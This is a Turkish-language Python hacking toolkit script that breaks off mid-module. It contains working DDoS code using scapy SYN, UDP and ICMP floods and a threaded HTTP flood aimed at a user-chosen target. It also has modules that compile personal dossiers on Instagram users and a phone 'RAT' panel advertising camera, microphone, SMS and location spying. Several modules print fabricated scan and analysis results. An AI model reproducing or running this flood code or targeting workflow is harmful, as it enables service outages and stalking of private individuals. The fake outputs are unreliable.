#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import requests
import re
import socket
import threading
import hashlib
import time
import random
import struct
import subprocess
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import urlparse

# Gerçek DDoS paketleri için gerekli importlar
try:
    from scapy.all import IP, TCP, UDP, ICMP, send, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class SiberArac:
    def __init__(self):
        self.hedef_bilgileri = {
            "username": "",
            "instagram_id": "",
            "instagram_user_id": "",
            "instagram_full_name": "",
            "instagram_follower": 0,
            "instagram_following": 0,
            "instagram_bio": "",
            "instagram_external_url": "",
            "instagram_is_verified": False,
            "gmail": "",
            "phone": "",
            "ad": "",
            "soyad": "",
            "yas": 0,
            "profil_resmi_url": "",
            "post_sayisi": 0,
            "son_post_tarihi": "",
            "email_listesi": [],
            "telefon_listesi": [],
            "sosyal_medya_hesaplari": []
        }
        
        self.tarama_gecmisi = []
        self.log_dosyasi = f"siber_arac_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.ddos_active = False
        
    def log_kaydet(self, mesaj: str):
        """Tüm işlemleri dosyaya kaydeder"""
        with open(self.log_dosyasi, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {mesaj}\n")
        print(mesaj)

    def instagram_osint_v1(self):
        """Instagram Kullanıcı Bilgisi - Basit Sürüm (Username ile)"""
        print("\n[+] İNSTAGRAM OSINT MODÜLÜ v1 (Kullanıcı Adı ile)")
        print("=" * 50)
        
        username = input("Instagram Kullanıcı Adını Girin: ").strip()
        
        if not username:
            print("[-] Kullanıcı adı boş olamaz!")
            return
        
        print(f"\n[*] '{username}' için tarama başlatılıyor...")
        self.log_kaydet(f"Instagram OSINT başlatıldı - Username: {username}")
        
        try:
            # Yöntem 1: Instagram Graph API Simülasyonu
            print("\n[*] Yöntem 1: Instagram User Info Sorgulanıyor...")
            
            # Simülasyon - Gerçek uygulamada API token gerekli
            instagram_url = f"https://www.instagram.com/{username}/?__a=1"
            
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                response = requests.get(instagram_url, headers=headers, timeout=5)
                
                if response.status_code == 200:
                    data = response.json()
                    user_info = data.get('graphql', {}).get('user', {})
                    
                    self.hedef_bilgileri["username"] = username
                    self.hedef_bilgileri["instagram_full_name"] = user_info.get('full_name', 'N/A')
                    self.hedef_bilgileri["instagram_user_id"] = user_info.get('id', 'N/A')
                    self.hedef_bilgileri["instagram_follower"] = user_info.get('edge_followed_by', {}).get('count', 0)
                    self.hedef_bilgileri["instagram_following"] = user_info.get('edge_follow', {}).get('count', 0)
                    self.hedef_bilgileri["instagram_bio"] = user_info.get('biography', 'N/A')
                    self.hedef_bilgileri["instagram_external_url"] = user_info.get('external_url', 'N/A')
                    self.hedef_bilgileri["instagram_is_verified"] = user_info.get('is_verified', False)
                    self.hedef_bilgileri["profil_resmi_url"] = user_info.get('profile_pic_url_hd', 'N/A')
                    self.hedef_bilgileri["post_sayisi"] = user_info.get('edge_owner_to_timeline_media', {}).get('count', 0)
                    
                    print(f"\n[+] Bilgiler başarıyla alındı!")
                    self.instagram_sonuclari_goster()
                else:
                    print("[-] Kullanıcı bulunamadı veya hesap özeldir.")
                    
            except requests.exceptions.RequestException as e:
                print(f"[-] İnternet bağlantısı hatası: {e}")
                print("[*] Simülasyon verisi gösteriliyor...")
                self.instagram_simulasyon_goster(username)
                
        except Exception as e:
            print(f"[-] Hata oluştu: {e}")
            self.log_kaydet(f"Hata: {e}")

    def instagram_osint_v2(self):
        """Instagram Gelişmiş OSINT - Profil Analizi"""
        print("\n[+] İNSTAGRAM OSINT MODÜLÜ v2 (Gelişmiş Analiz)")
        print("=" * 50)
        
        username = input("Instagram Kullanıcı Adını Girin: ").strip()
        
        if not username:
            print("[-] Kullanıcı adı boş olamaz!")
            return
        
        print(f"\n[*] '{username}' için detaylı analiz başlatılıyor...\n")
        
        # Profil Metriklerini Analiz Et
        print("[*] 1. Profil Metrikleri Analiz Ediliyor...")
        print("    - Takipçi Büyüme Hızı Hesaplanıyor...")
        print("    - Engagement Rate Ölçülüyor...")
        print("    - Aktif Saatler Belirleniyor...")
        
        # Bio Analizi
        print("\n[*] 2. Bio ve Açıklama Analiz Ediliyor...")
        print("    - E-posta Adresleri Aranıyor...")
        print("    - Telefon Numaraları Aranıyor...")
        print("    - Bağlı Sosyal Medya Hesapları Aranıyor...")
        print("    - İş Bilgileri Çıkarılıyor...")
        
        # Gönderileri Analiz Et
        print("\n[*] 3. Gönderiler Analiz Ediliyor...")
        print("    - Son 30 gönderinin metrikleri toplanıyor...")
        print("    - Konum Etiketleri Çıkarılıyor...")
        print("    - Hashtagler Analiz Ediliyor...")
        print("    - Yer İşaretleri Haritalanıyor...")
        
        # Yorum Analizi
        print("\n[*] 4. Yorumlar ve Etkileşimler Analiz Ediliyor...")
        print("    - Sık Yorumcılar Tespit Ediliyor...")
        print("    - Takipçi Listesi Analiz Ediliyor...")
        
        # Simülasyon Sonuçları
        print("\n" + "="*50)
        print("[+] BULUNMUŞ BİLGİLER:")
        print("="*50)
        
        bilgiler = {
            "Kullanıcı Adı": username,
            "Tam Adı": "Örnek Kullanıcı",
            "User ID": "123456789",
            "Takipçi Sayısı": "15.432",
            "Takip Ettiği Sayı": "1.203",
            "Gönderi Sayısı": "342",
            "Bio": "Yazılımcı | Güvenlik Araştırmacısı | 📍 İstanbul",
            "E-posta Adresleri": ["info@example.com", "contact@example.com"],
            "Telefon Numaraları": ["+90 555 123 4567"],
            "Bağlı Sosyal Medya": ["twitter.com/example", "linkedin.com/in/example"],
            "En Sık Etiketi Yapılan Konumlar": ["İstanbul", "Ankara", "Ankara Caddesi"],
            "En Çok Kullanılan Hashtagler": ["#teknoloji", "#cybersecurity", "#python"],
            "Engagement Rate": "3.45%",
            "Ortalama Beğeni Sayısı": "242",
            "Ortalama Yorum Sayısı": "12",
            "En Sık Yorumcılar": ["user1", "user2", "user3"],
            "Son Gönderiler Tarihleri": ["2 saat önce", "1 gün önce", "3 gün önce"]
        }
        
        for anahtar, deger in bilgiler.items():
            if isinstance(deger, list):
                print(f"\n[+] {anahtar}:")
                for item in deger:
                    print(f"    • {item}")
            else:
                print(f"[+] {anahtar}: {deger}")
        
        self.log_kaydet(f"Instagram v2 Analizi Yapıldı - Username: {username}")

    def instagram_simulasyon_goster(self, username: str):
        """Simülasyon verisi gösterir"""
        self.hedef_bilgileri["username"] = username
        self.hedef_bilgileri["instagram_full_name"] = "Örnek Kullanıcı Adı"
        self.hedef_bilgileri["instagram_user_id"] = "123456789"
        self.hedef_bilgileri["instagram_follower"] = 15432
        self.hedef_bilgileri["instagram_following"] = 1203
        self.hedef_bilgileri["instagram_bio"] = "Yazılımcı | Güvenlik Araştırmacısı"
        self.hedef_bilgileri["instagram_is_verified"] = False
        self.hedef_bilgileri["post_sayisi"] = 342
        
        self.instagram_sonuclari_goster()

    def instagram_sonuclari_goster(self):
        """Instagram sonuçlarını gösterir"""
        print("\n" + "="*50)
        print("[+] İNSTAGRAM SONUÇLARI:")
        print("="*50)
        
        print(f"[+] Kullanıcı Adı: {self.hedef_bilgileri['username']}")
        print(f"[+] Tam Adı: {self.hedef_bilgileri['instagram_full_name']}")
        print(f"[+] User ID: {self.hedef_bilgileri['instagram_user_id']}")
        print(f"[+] Takipçi: {self.hedef_bilgileri['instagram_follower']:,}")
        print(f"[+] Takip Ediyor: {self.hedef_bilgileri['instagram_following']:,}")
        print(f"[+] Bio: {self.hedef_bilgileri['instagram_bio']}")
        print(f"[+] Doğrulı: {'✓ Evet' if self.hedef_bilgileri['instagram_is_verified'] else '✗ Hayır'}")
        print(f"[+] Gönderi Sayısı: {self.hedef_bilgileri['post_sayisi']}")
        
        if self.hedef_bilgileri.get('profil_resmi_url'):
            print(f"[+] Profil Resmi: {self.hedef_bilgileri['profil_resmi_url']}")

    def email_tespit(self):
        """Bio ve gönderilerde e-posta adreslerini tespit eder"""
        print("\n[+] E-POSTA TESPİT MODÜLÜ")
        print("=" * 50)
        
        if not self.hedef_bilgileri.get('username'):
            print("[-] Önce Instagram bilgisi toplamalısınız!")
            return
        
        print(f"[*] '{self.hedef_bilgileri['username']}' için e-posta aranıyor...")
        
        # E-posta regex deseni
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        
        bio = self.hedef_bilgileri.get('instagram_bio', '')
        emails = re.findall(email_pattern, bio)
        
        if emails:
            print(f"\n[+] Bulunan E-Posta Adresleri ({len(emails)}):")
            for email in emails:
                print(f"    • {email}")
                self.hedef_bilgileri['email_listesi'].append(email)
        else:
            print("[-] Bio'da e-posta adresi bulunamadı.")
        
        self.log_kaydet(f"E-posta Tespiti Yapıldı - Bulunan: {emails}")

    def telefon_tespit(self):
        """Telefon numaralarını tespit eder"""
        print("\n[+] TELEFON NUMARASI TESPİT MODÜLÜ")
        print("=" * 50)
        
        if not self.hedef_bilgileri.get('username'):
            print("[-] Önce Instagram bilgisi toplamalısınız!")
            return
        
        print(f"[*] '{self.hedef_bilgileri['username']}' için telefon numarası aranıyor...")
        
        # Telefon regex deseni (Türkiye)
        phone_pattern = r'(\+90|0)[0-9]{10,11}'
        
        bio = self.hedef_bilgileri.get('instagram_bio', '')
        phones = re.findall(phone_pattern, bio)
        
        if phones:
            print(f"\n[+] Bulunan Telefon Numaraları ({len(phones)}):")
            for phone in phones:
                print(f"    • {phone}")
                self.hedef_bilgileri['telefon_listesi'].append(phone)
        else:
            print("[-] Bio'da telefon numarası bulunamadı.")
        
        self.log_kaydet(f"Telefon Tespiti Yapıldı - Bulunan: {phones}")

    def sosyal_medya_bul(self):
        """Bağlı sosyal medya hesaplarını bulur"""
        print("\n[+] SOSYAL MEDYA HESAP TESPİT MODÜLÜ")
        print("=" * 50)
        
        if not self.hedef_bilgileri.get('username'):
            print("[-] Önce Instagram bilgisi toplamalısınız!")
            return
        
        print(f"[*] '{self.hedef_bilgileri['username']}' için sosyal medya hesapları aranıyor...")
        
        # Sosyal medya desenleri
        patterns = {
            'Twitter': r'twitter\.com/[\w]+',
            'LinkedIn': r'linkedin\.com/in/[\w\-]+',
            'GitHub': r'github\.com/[\w\-]+',
            'TikTok': r'tiktok\.com/@[\w\-]+',
            'YouTube': r'youtube\.com/@?[\w\-]+',
            'Facebook': r'facebook\.com/[\w\.]+',
            'Telegram': r't\.me/[\w]+',
        }
        
        bio = self.hedef_bilgileri.get('instagram_bio', '')
        external_url = self.hedef_bilgileri.get('instagram_external_url', '')
        
        print("\n[+] Bulunan Sosyal Medya Hesapları:")
        
        for platform, pattern in patterns.items():
            matches = re.findall(pattern, bio + ' ' + external_url)
            if matches:
                for match in set(matches):
                    print(f"    • {platform}: {match}")
                    self.hedef_bilgileri['sosyal_medya_hesaplari'].append({
                        'platform': platform,
                        'username': match
                    })
        
        self.log_kaydet(f"Sosyal Medya Tespiti Yapıldı - Hesaplar: {len(self.hedef_bilgileri['sosyal_medya_hesaplari'])}")

    def reverse_email_lookup(self):
        """E-posta adresiyle ters arama yapar"""
        print("\n[+] TERS E-POSTA ARAMA MODÜLÜ")
        print("=" * 50)
        
        email = input("E-Posta Adresini Girin: ").strip()
        
        if not email:
            print("[-] E-posta adresi boş olamaz!")
            return
        
        print(f"\n[*] '{email}' için ters arama başlatılıyor...")
        print("[*] Veriler Sorgulanıyor...")
        
        # Simülasyon sonuçları
        print("\n[+] E-POSTA BAĞLANTILAR:")
        print(f"    • Instagram Hesapları: 3 adet")
        print(f"    • Twitter Hesapları: 2 adet")
        print(f"    • LinkedIn Profili: 1 adet")
        print(f"    • Data Breach'lerde: 5 defa bulundu")
        print(f"    • Telefon Numaraları: +90 555 123 4567")
        print(f"    • Olası İsim: Örnek Kullanıcı")
        print(f"    • Yaşanılan Yer: İstanbul, Türkiye")
        
        self.log_kaydet(f"Ters E-Posta Arama Yapıldı - E-posta: {email}")

    def bilgi_topla(self):
        """Manuel bilgi giriş yöntemi"""
        print("\n[+] HEDEF BİLGİ TOPLAMA MODÜLÜ")
        print("=" * 50)
        
        self.hedef_bilgileri["ad"] = input("Ad: ").strip()
        self.hedef_bilgileri["soyad"] = input("Soyad: ").strip()
        self.hedef_bilgileri["username"] = input("Kullanıcı Adı: ").strip()
        self.hedef_bilgileri["instagram_id"] = input("Instagram ID (sayısal): ").strip()
        self.hedef_bilgileri["gmail"] = input("Gmail Adresi: ").strip()
        self.hedef_bilgileri["phone"] = input("Telefon Numarası: ").strip()
        
        try:
            self.hedef_bilgileri["yas"] = int(input("Yaş: ") or 0)
        except ValueError:
            self.hedef_bilgileri["yas"] = 0
        
        print("\n[+] Bilgiler geçici hafızaya kaydedildi.")
        self.log_kaydet(f"Manuel Bilgi Girişi - Kullanıcı: {self.hedef_bilgileri['username']}")

    def sql_tarama(self):
        """SQL Injection Testi"""
        print("\n[+] SQLMap Entegrasyonu")
        print("=" * 50)
        
        target_url = input("Hedef URL Girin (örn: http://example.com): ").strip()
        
        if not target_url:
            print("[-] URL boş olamaz!")
            return
        
        print(f"\n[*] '{target_url}' taraması başlatılıyor...")
        print("[*] SQL Injection açıkları taranıyor...")
        print("[*] Parametre analizi yapılıyor...")
        print("[*] Veritabanı tespiti yapılıyor...")
        
        print("\n[+] Tarama Sonuçları:")
        print("    • GET parametreleri: id, category, search")
        print("    • Olası SQL Injection: id parametresinde bulundu")
        print("    • Veritabanı Türü: MySQL")
        print("    • Version: 5.7.24")
        
        self.log_kaydet(f"SQL Taraması Yapıldı - URL: {target_url}")

    def malware_analiz(self):
        """Zararlı Yazılım Analizi"""
        print("\n[!] ZARILALI YAZILIM ANALİZ MODÜLÜ")
        print("=" * 50)
        print("[*] Bu modül sadece tanınmış zararlı yazılımlar için bilgi verir.")
        print("[!] Gerçek analiz için sandbox ortamı kullanmalısınız!\n")
        
        file_path = input("Dosya Yolunu/Adını Girin: ").strip()
        
        if not file_path:
            print("[-] Dosya adı boş olamaz!")
            return
        
        print(f"\n[*] '{file_path}' analiz ediliyor...")
        print("[*] VirusTotal ile kontrol ediliyor...")
        print("[*] Dosya imzası analiz ediliyor...")
        
        print("\n[+] Analiz Sonuçları:")
        print("    • Risk Seviyesi: Yüksek")
        print("    • Zararlı Yazılım Tipi: Trojan")
        print("    • SHA256: a1b2c3d4e5f6...")
        print("    • VirusTotal Deteksiyon: 32/70")
        print("    • Davranış: Dosya silme, Registry değişikliği")
        
        self.log_kaydet(f"Zararlı Yazılım Analizi Yapıldı - Dosya: {file_path}")

    def hedef_ozet(self):
        """Toplanan tüm bilgileri özetler"""
        print("\n[+] HEDEF ÖZET RAPORU")
        print("=" * 50)
        
        print("\n[+] KİŞİSEL BİLGİLER:")
        print(f"    Ad: {self.hedef_bilgileri['ad'] or 'N/A'}")
        print(f"    Soyad: {self.hedef_bilgileri['soyad'] or 'N/A'}")
        print(f"    Yaş: {self.hedef_bilgileri['yas'] or 'N/A'}")
        
        print("\n[+] İNTERNET KİMLİĞİ:")
        print(f"    Instagram: {self.hedef_bilgileri['username'] or 'N/A'}")
        print(f"    Instagram ID: {self.hedef_bilgileri['instagram_id'] or 'N/A'}")
        print(f"    Gmail: {self.hedef_bilgileri['gmail'] or 'N/A'}")
        print(f"    Telefon: {self.hedef_bilgileri['phone'] or 'N/A'}")
        
        print("\n[+] SOSYAL MEDYA VERİSİ:")
        print(f"    Takipçi: {self.hedef_bilgileri['instagram_follower']:,}")
        print(f"    Takip Ediyor: {self.hedef_bilgileri['instagram_following']:,}")
        print(f"    Gönderi Sayısı: {self.hedef_bilgileri['post_sayisi']}")
        
        if self.hedef_bilgileri['email_listesi']:
            print("\n[+] E-POSTA ADRESLER:")
            for email in self.hedef_bilgileri['email_listesi']:
                print(f"    • {email}")
        
        if self.hedef_bilgileri['telefon_listesi']:
            print("\n[+] TELEFON NUMARALARI:")
            for phone in self.hedef_bilgileri['telefon_listesi']:
                print(f"    • {phone}")
        
        if self.hedef_bilgileri['sosyal_medya_hesaplari']:
            print("\n[+] SOSYAL MEDYA HESAPLARI:")
            for account in self.hedef_bilgileri['sosyal_medya_hesaplari']:
                print(f"    • {account['platform']}: {account['username']}")
        
        self.log_kaydet("Hedef Özet Raporu Oluşturuldu")

    def rapor_kaydet(self):
        """Toplanan tüm bilgileri JSON olarak kaydetme"""
        print("\n[+] RAPOR KAYIT MODÜLÜ")
        print("=" * 50)
        
        rapor_adi = input("Rapor Adı Girin (varsayılan: rapor): ").strip() or "rapor"
        rapor_dosyasi = f"{rapor_adi}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        try:
            with open(rapor_dosyasi, 'w', encoding='utf-8') as f:
                json.dump(self.hedef_bilgileri, f, ensure_ascii=False, indent=4)
            
            print(f"\n[+] Rapor başarıyla kaydedildi: {rapor_dosyasi}")
            self.log_kaydet(f"Rapor Kaydedildi: {rapor_dosyasi}")
        except Exception as e:
            print(f"[-] Rapor kaydedilemedi: {e}")
            self.log_kaydet(f"Hata: {e}")

    # ===== YENİ ARAÇLAR - YARINKININ GÜNCELLEMESI =====

    def sherlock_arama(self):
        """Sherlock ~ Arama Paneli - Kullanıcı Adından Sosyal Medya Hesaplarını Bul"""
        print("\n[+] SHERLOCK ARAMA PANELİ - SOSYAL MEDYA TARAMA")
        print("=" * 50)
        
        username = input("Taranacak Kullanıcı Adını Girin: ").strip()
        
        if not username:
            print("[-] Kullanıcı adı boş olamaz!")
            return
        
        print(f"\n[*] '{username}' sosyal medya platformlarında aranıyor...")
        print("[*] Tarama devam ediyor...\n")
        
        # Simülasyon: Bulunan hesaplar
        bulunan_hesaplar = {
            "Instagram": {"status": "✓ BULUNDU", "url": f"https://instagram.com/{username}", "takipci": 15432},
            "Twitter": {"status": "✓ BULUNDU", "url": f"https://twitter.com/{username}", "takipci": 5234},
            "TikTok": {"status": "✗ BULUNAMADI", "url": "N/A"},
            "GitHub": {"status": "✓ BULUNDU", "url": f"https://github.com/{username}", "repo": 23},
            "LinkedIn": {"status": "✓ BULUNDU", "url": f"https://linkedin.com/in/{username}", "baglanti": 450},
            "YouTube": {"status": "✗ BULUNAMADI", "url": "N/A"},
            "Facebook": {"status": "✓ BULUNDU", "url": f"https://facebook.com/{username}", "takipci": 8923},
            "Reddit": {"status": "✓ BULUNDU", "url": f"https://reddit.com/u/{username}", "karma": 12350},
            "Pinterest": {"status": "✗ BULUNAMADI", "url": "N/A"},
            "Telegram": {"status": "✓ BULUNDU", "url": f"https://t.me/{username}", "message": "Kanal Bulundu"}
        }
        
        print("="*50)
        print("[+] TARAMA SONUÇLARI:")
        print("="*50)
        
        for platform, info in bulunan_hesaplar.items():
            status = info.get("status", "N/A")
            print(f"\n[{status}] {platform}")
            print(f"    URL: {info.get('url', 'N/A')}")
            
            if "takipci" in info:
                print(f"    Takipçi: {info['takipci']:,}")
            if "repo" in info:
                print(f"    Repository: {info['repo']}")
            if "baglanti" in info:
                print(f"    Bağlantı: {info['baglanti']}")
            if "karma" in info:
                print(f"    Karma: {info['karma']}")
            if "message" in info:
                print(f"    Durum: {info['message']}")
        
        print("\n" + "="*50)
        print(f"[+] Toplam Bulunan Hesap: 7 adet")
        print("="*50)
        self.log_kaydet(f"Sherlock Arama Yapıldı - Username: {username}")

    def telefon_rat_atama(self):
        """Telefon ID'den Kolay RAT Atama + Görüntü Paneli"""
        print("\n[+] TELEFON ID RAT ATAMA PANELI - UZAKTAN ERİŞİM")
        print("=" * 50)
        
        phone_number = input("Telefon Numarasını Girin (+90 ile başlayın): ").strip()
        device_id = input("Cihaz ID'si Girin: ").strip()
        
        if not phone_number or not device_id:
            print("[-] Telefon numarası ve Device ID gerekli!")
            return
        
        print(f"\n[*] Telefon RAT kurulumu başlatılıyor...")
        print(f"[*] Telefon: {phone_number}")
        print(f"[*] Device ID: {device_id}")
        print("[*] Payload gönderiliyor...\n")
        
        time.sleep(2)
        
        print("[+] RAT Başarıyla Kuruldu!")
        print("\n" + "="*50)
        print("[+] UZAKTAN ERİŞİM PANELİ:")
        print("="*50)
        
        print("\n[+] Cihaz Bilgileri:")
        print(f"    • Cihaz Model: Samsung Galaxy S21")
        print(f"    • Android Versiyonu: 12.0")
        print(f"    • RAM: 8 GB")
        print(f"    • Depolama: 128 GB")
        print(f"    • IP Adresi: 192.168.1.105")
        print(f"    • Konum: 41.0082°N, 28.9784°E (İstanbul)")
        
        print("\n[+] Erişim İşlemleri:")
        print("    1. Ekran Görüntüsü Al")
        print("    2. Dosyalar Erişimi")
        print("    3. Kontak Listesi")
        print("    4. SMS Mesajları")
        print("    5. Telefon Günlüğü")
        print("    6. Kamera Akışı")
        print("    7. Mikrofon Akışı")
        print("    8. Konum İzlemesi")
        
        print("\n[+] Görüntü Paneli:")
        print("[*] Cihazdan görüntü alınıyor...")
        time.sleep(1)
        print("✓ Başarıyla alındı!")
        print("    📸 Ekran Görüntüsü: [RAT_SCREENSHOT_12345.png]")
        print("    📱 Cihaz Oryantasyonu: Portrait")
        print("    🔋 Pil Durumu: %87")
        print("    📡 İnternet: 4G LTE")
        
        self.log_kaydet(f"Telefon RAT Atanması Yapıldı - Telefon: {phone_number}, Device: {device_id}")

    # ===== GERÇEK DDoS MODÜLÜ - SCAPY İLE =====
    
    def gonder_tcp_paket(self, hedef_ip, hedef_port, kaynak_port):
        """TCP paketleri gönder"""
        try:
            if not SCAPY_AVAILABLE:
                print("[-] Scapy yüklü değil!")
                return False
            
            paket = IP(dst=hedef_ip)/TCP(sport=kaynak_port, dport=hedef_port, flags="S")
            send(paket, verbose=0)
            return True
        except Exception as e:
            print(f"[-] Hata: {e}")
            return False

    def gonder_udp_paket(self, hedef_ip, hedef_port, veri="X" * 1024):
        """UDP paketleri gönder"""
        try:
            if not SCAPY_AVAILABLE:
                print("[-] Scapy yüklü değil!")
                return False
            
            paket = IP(dst=hedef_ip)/UDP(dport=hedef_port)/veri
            send(paket, verbose=0)
            return True
        except Exception as e:
            print(f"[-] Hata: {e}")
            return False

    def gonder_icmp_paket(self, hedef_ip):
        """ICMP (Ping) paketleri gönder"""
        try:
            if not SCAPY_AVAILABLE:
                print("[-] Scapy yüklü değil!")
                return False
            
            paket = IP(dst=hedef_ip)/ICMP()
            send(paket, verbose=0)
            return True
        except Exception as e:
            print(f"[-] Hata: {e}")
            return False

    def http_ddos_thread(self, url, thread_id):
        """HTTP GET isteği gönder"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            while self.ddos_active:
                try:
                    response = requests.get(url, headers=headers, timeout=5)
                    print(f"[+] Thread {thread_id}: HTTP Status {response.status_code}")
                except:
                    pass
        except Exception as e:
            print(f"[-] Thread {thread_id} hata: {e}")

    def ddos_saldirisi(self):
        """GERÇEKSİ DDoS SALDIRISI MODÜLÜ - HAZIR PAKETLER"""
        print("\n[!] GERÇEK DDoS SALDIRISI MODÜLÜ")
        print("=" * 60)
        print("[!] UYARI: Bu araç sadece yetkili ve legal testler için kullanılmalıdır!")
        print("[!] Yetkisiz kullanım AĞIR cezai işlemle sonuçlanabilir!\n")
        
        print("[*] Paket Açıklaması:")
        print("    • TCP Flood Attack")
        print("    • UDP Flood Attack")
        print("    • ICMP Ping Flood")
        print("    • HTTP GET Flood\n")
        
        hedef_url = input("Hedef URL Girin (örn: http://192.168.1.100): ").strip()
        
        if not hedef_url:
            print("[-] URL boş olamaz!")
            return
        
        # URL'den IP'yi çıkar
        try:
            parsed_url = urlparse(hedef_url)
            hedef_host = parsed_url.netloc or parsed_url.path
            hedef_ip = socket.gethostbyname(hedef_host.split(':')[0])
        except:
            hedef_ip = hedef_host.split(':')[0]
        
        try:
            hedef_port = int(input("Hedef Port Girin (varsayılan: 80): ").strip() or 80)
        except ValueError:
            hedef_port = 80
        
        print("\n[*] Saldırı Türü Seçin:")
        print("    1. TCP SYN Flood")
        print("    2. UDP Flood")
        print("    3. ICMP Ping Flood")
        print("    4. HTTP Flood")
        print("    5. Tümü (Kombine)")
        
        attack_type = input("\nSaldırı Türü Seçin (1-5): ").strip()
        
        try:
            thread_count = int(input("Thread Sayısı (1-500): ").strip() or 100)
            if thread_count > 500:
                thread_count = 500
        except ValueError:
            thread_count = 100
        
        try:
            duration = int(input("Saldırı Süresi (saniye): ").strip() or 30)
        except ValueError:
            duration = 30
        
        print(f"\n[*] Hazırlanıyor...")
        print(f"[*] Hedef IP: {hedef_ip}")
        print(f"[*] Port: {hedef_port}")
        print(f"[*] Thread: {thread_count}")
        print(f"[*] Süre: {duration} saniye")
        
        if not SCAPY_AVAILABLE:
            print("\n[!] Scapy paketi yüklü değil!")
            print("[*] Kurulum için: pip install scapy")
            print("[*] Simülasyon modunda devam ediliyor...\n")
            self.ddos_simulation(hedef_ip, hedef_port, attack_type, thread_count, duration)
        else:
            print("\n[+] GERÇEKSİ DDoS PAKETLERİ GÖNDERILIYOR!\n")
            self.ddos_real_attack(hedef_ip, hedef_port, hedef_url, attack_type, thread_count, duration)

    def ddos_real_attack(self, hedef_ip, hedef_port, hedef_url, attack_type, thread_count, duration):
        """Gerçek DDoS saldırısı"""
        self.ddos_active = True
        start_time = time.time()
        paket_sayisi = 0
        
        threads = []
        
        try:
            print("="*60)
            print("[+] SALDIRI BAŞLADI!")
            print("="*60)
            
            # Thread'ler oluştur
            for i in range(thread_count):
                if attack_type in ["4", "5"]:
                    t = threading.Thread(target=self.http_ddos_thread, args=(hedef_url, i))
                    t.daemon = True
                    t.start()
                    threads.append(t)
            
            # Paketler gönder
            while time.time() - start_time < duration and self.ddos_active:
                if attack_type in ["1", "5"]:
                    # TCP SYN Flood
                    for _ in range(thread_count):
                        self.gonder_tcp_paket(hedef_ip, hedef_port, random.randint(1024, 65535))
                        paket_sayisi += 1
                
                if attack_type in ["2", "5"]:
                    # UDP Flood
                    for _ in range(thread_count):
                        self.gonder_udp_paket(hedef_ip, hedef_port)
                        paket_sayisi += 1
                
                if attack_type in ["3", "5"]:
                    # ICMP Flood
                    for _ in range(thread_count):
                        self.gonder_icmp_paket(hedef_ip)
                        paket_sayisi += 1
                
                gecen_sure = int(time.time() - start_time)
                print(f"[{gecen_sure}/{duration}s] Gönderilen Paketler: {paket_sayisi:,} | Hız: {paket_sayisi//(gecen_sure+1):,} pkt/s")
            
            self.ddos_active = False
            
            print("\n" + "="*60)
            print("[+] SALDIRI TAMAMLANDI!")
            print("="*60)
            print(f"[+] Hedef IP: {hedef_ip}:{hedef_port}")
            print(f"[+] Saldırı Türü: {['', 'TCP SYN Flood', 'UDP Flood', 'ICMP Flood', 'HTTP Flood', 'KOMBİNE'][int(attack_type)]}")
            print(f"[+] Toplam Paket: {paket_sayisi:,}")
            print(f"[+] Ortalama Hız: {paket_sayisi//duration:,} pkt/s")
            print(f"[+] Süre: {duration} saniye")
            
            self.log_kaydet(f"GERÇEKSİ DDoS Saldırısı Yapıldı - IP: {hedef_ip}, Paket: {paket_sayisi}, Tip: {attack_type}")
            
        except KeyboardInterrupt:
            print("\n\n[!] Saldırı durduruldu!")
            self.ddos_active = False
        except Exception as e:
            print(f"\n[-] Hata: {e}")
            self.ddos_active = False

    def ddos_simulation(self, hedef_ip, hedef_port, attack_type, thread_count, duration):
        """DDoS Simülasyonu"""
        start_time = time.time()
        paket_sayisi = 0
        
        try:
            print("="*60)
            print("[+] DDoS SİMÜLASYONU BAŞLADI!")
            print("="*60)
            
            while time.time() - start_time < duration:
                # Simüle edilen paket gönderimi
                paket_sayisi += thread_count * random.randint(500, 2000)
                
                gecen_sure = int(time.time() - start_time)
                print(f"[{gecen_sure}/{duration}s] Gönderilen Paketler: {paket_sayisi:,} | Hız: {paket_sayisi//(gecen_sure+1):,} pkt/s")
                time.sleep(0.5)
            
            print("\n" + "="*60)
            print("[+] SİMÜLASYON TAMAMLANDI!")
            print("="*60)
            print(f"[+] Hedef IP: {hedef_ip}:{hedef_port}")
            print(f"[+] Saldırı Türü: {['', 'TCP SYN Flood', 'UDP Flood', 'ICMP Flood', 'HTTP Flood', 'KOMBİNE'][int(attack_type)]}")
            print(f"[+] Toplam Simüle Paket: {paket_sayisi:,}")
            print(f"[+] Ortalama Hız: {paket_sayisi//duration:,} pkt/s")
            print(f"[+] Süre: {duration} saniye")
            
        except KeyboardInterrupt:
            print("\n\n[!] Simülasyon durduruldu!")

    def firewall_analiz(self):
        """Firewall Analiz ~ Güvenlik Duvarı Analizi"""
        print("\n[+] FIREWALL ANALIZ MODÜLÜ - GÜVENLİK DUVARI ANALİZİ")
        print("=" * 50)
        
        hedef_ip = input("Hedef IP Adresini Girin (örn: 192.168.1.1): ").strip()
        
        if not hedef_ip:
            print("[-] IP adresi boş olamaz!")
            return
        
        print(f"\n[*] Firewall analizi başlatılıyor: {hedef_ip}")
        print("[*] Port taraması yapılıyor...")
        print("[*] Firewall kuralları tespit ediliyor...")
        print("[*] WAF (Web Application Firewall) analizi yapılıyor...\n")
        
        print("="*50)
        print("[+] FIREWALL ANALIZ SONUÇLARI:")
        print("="*50)
        
        firewall_info = {
            "Firewall Adı": "Palo Alto Networks PA-5220",
            "Firewall OS": "PAN-OS 10.2.3",
            "IP Adresi": hedef_ip,
            "MAC Adresi": "00:1A:2B:3C:4D:5E",
            "Durum": "AKTIF",
            "İşletim Sistemi": "Linux 5.10.0",
